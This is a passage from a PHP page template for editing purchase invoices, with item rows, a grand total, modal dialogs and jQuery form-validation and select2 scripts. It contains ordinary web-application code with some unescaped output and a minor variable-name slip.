		echo '<option value="'.$valuemedia['item_id'].'">'.$valuemedia['item_name'].'</option>';
	}
echo'
		</select>
	</td>
	<td style="width:100px;"><input type="number" class="col-lg-12 jQinv_item_size" name="size['.$incr.']" id="size['.$incr.']" /></td>
	<td style="width:100px;"><input type="number" class="col-lg-12 jQinv_item_meter" name="meter['.$incr.']" id="meter['.$incr.']" /></td>
	<td style="width:100px;"><input type="number" class="col-lg-12 jQinv_item_qty" name="qty['.$incr.']" id="qty['.$incr.']" /></td>
	<td style="width:100px;"><input type="number" class="col-lg-12 jQinv_item_sqft" name="sqft['.$iprs.']" id="sqft['.$incr.']" readonly /></td>
	<td style="width:100px;"><input type="text" class="col-lg-12 jQinv_item_rate" name="rate['.$incr.']" id="rate['.$incr.']" /></td>
	<td style="width:150px;"><input type="number" class="col-lg-12 jQinv_item_total" name="amount['.$incr.']" id="amount['.$incr.']" readonly /></td>	
</tr>';
}
}
//-----------------------------------------
echo '
<tr class="last_row">
	<td colspan="15" style="text-align:right;">
		<p class="clearfix"><b> Total: <span class="inV_grandtotal">Rs.<span>'.$rowstd['grandtotal'].'</span></span></b></p>
		<input type="hidden" id="inV_grandtotal" name="inV_grandtotal" value="'.$rowstd['grandtotal'].'">
	</td>
</tr>
</tbody>
</table>

<div style="clear:both;"></div>

</div>

<div class="modal-footer">
	<input class="btn btn-primary" type="submit" value="Save Changes" id="bill_changes" name="bill_changes">
	<button type="button" class="btn btn-default" onclick="location.href=\'purchase.php\'" >Cancel</button>
</div>

</div>
</form>
<script>
	$("#idvendor").select2({
        allowClear: true
    });
	
</script>
</div>
</div>
</div>
<!--WI_ADD_NEW_TASK_MODAL-->';
//------------------------------------------------
}
}
echo '
</div>
</div>
</div>
<!--WI_MY_TASKS_TABLE-->


<!--WI_NOTIFICATION-->       
<!--WI_NOTIFICATION-->
</div>
</div>
<!-- Matter ends -->
</div>
<!-- Mainbar ends -->
<div class="clearfix"></div>
</div>
<!-- Content ends -->
<!-- Footer starts -->
<footer>
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<p class="copy">Powered by: | <a href="'.COPY_RIGHTS_URL.'" target="_blank">'.COPY_RIGHTS.'</a> </p>
			</div>
		</div>
	</div>
</footer>
<!-- Footer ends -->

<!-- Scroll to top -->
<span class="totop"><a href="#"><i class="icon-chevron-up"></i></a></span> 

<!--WI_IFRAME_MODAL-->
<div class="row">
	<div id="modalIframe" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
		<div class="modal-dialog">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">x</button>
					<button type="button" class="full-screen-modal close" aria-hidden="true"><i class="icon-fullscreen"></i></button>
					<h4 class="modal-title" id="modal-iframe-title"> Edit</h4>
					<div class="clearfix"></div>
				</div>
				<div class="modal-body">
					<iframe frameborder="0" class="slimScrollBarModal----"></iframe>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-default" data-dismiss="modal" aria-hidden="true">Closed</button>
				</div>
			</div>
		</div>
	</div>
</div>
<!--WI_IFRAME_MODAL-->
<script src="js/purchase.js"></script>
<script type="text/javascript">
// close the div in 5 secs
window.setTimeout("closeHelpDiv();", 5000, 2500);

function closeHelpDiv(){
	document.getElementById("infoupdated").style.display=" none";
}
</script>
<!--JS_SELECT_LISTS-->
<script>
    $("#status").select2({
        allowClear: true
    });
	$("#status_edit").select2({
        allowClear: true
    });
	
	 $("#status").select2({
        allowClear: true
    });
	$("#status_edit").select2({
        allowClear: true
    });
	
	$("#id_designation").select2({
        allowClear: true
    });
	
	$("#id_designation_edit").select2({
        allowClear: true
    });
	
</script>
<script type="text/javascript">
$().ready(function() {
	$("#inv_form").validate({
		rules: {
             bill_no			: "required",
			 id_vendor		: "required"
		},
		messages: {
			bill_no				: "This field is required",
			id_vendor		: "This field is required"
		},
		submitHandler: function(form) {
		form.submit();
        }
	});
});
</script>
<script type="text/javascript">
$().ready(function() {
    
	$("#editCountry").validate({
		rules: {
             emply_name_edit		: "required",
			 emply_status_edit	: "required"
		},
		messages: {
			emply_name_edit		: "This field is required",
			emply_status_edit		: "This field is required"
		},
		submitHandler: function(form) {
		form.submit();
        }
	});
});
</script>

<script type="text/javascript">
$(document).ready(function(){
//---edit item link clicked-------
    $(".edit-country-modal").click(function(){
    
        //get variables from "edit link" data attributes
		var emply_status_edit 			= $(this).attr("data-com-status");
        var emply_name_edit 			= $(this).attr("data-com-name");
		var emply_cellno_edit 			= $(this).attr("data-com-phone");
		var emply_cnic_edit 			= $(this).attr("data-com-cnic");
		var emply_email_edit 			= $(this).attr("data-com-email");
		var emply_address_edit 			= $(this).attr("data-com-address");
		var emply_joindate_edit 		= $(this).attr("data-com-joindate");
		var id_designation_edit 		= $(this).attr("data-com-designation");
		var emply_id_edit 				= $(this).attr("data-com-id");

        //set modal input values dynamically
		$("#emply_name_edit")			.val(emply_name_edit);
		$("#emply_cellno_edit")			.val(emply_cellno_edit);
		$("#emply_cnic_edit")			.val(emply_cnic_edit);
		$("#emply_email_edit")			.val(emply_email_edit);
		$("#emply_address_edit")		.val(emply_address_edit);
		$("#emply_joindate_edit")		.val(emply_joindate_edit);
		$("#emply_id_edit")				.val(emply_id_edit);

       //pre-select data in pull down lists
       $("#emply_status_edit")			.select2().select2("val", emply_status_edit); 
	   $("#id_designation_edit")		.select2().select2("val", id_designation_edit); 
  });
    
});
</script>
<script type="text/javascript" src="js/custom/all-vendors.js"></script>
<script type="text/javascript" src="js/ckeditor/ckeditor.js"></script>
<script>
//USED BY: All date picking forms
$(document).ready(function(){
    $(".pickadate").datepicker({
       format: "yyyy-mm-dd",
       language: "lang",
       autoclose: true,
       todayHighlight: true
    });	
});
</script>
<script type="text/javascript" src="js/noty/jquery.noty.packaged.min.js"></script>
<script type="text/javascript">
	$(function () {
		$(".footable").footable();
	});
</script>
<script type="text/javascript" src="js/custom/custom.js"></script>
<script type="text/javascript" src="js/custom/custom.general.js"></script>
</body>
</html>';
//------------------------------------
} else { 
//------------------------------------
	header('location: index.php');
}
//------------------------------------
?>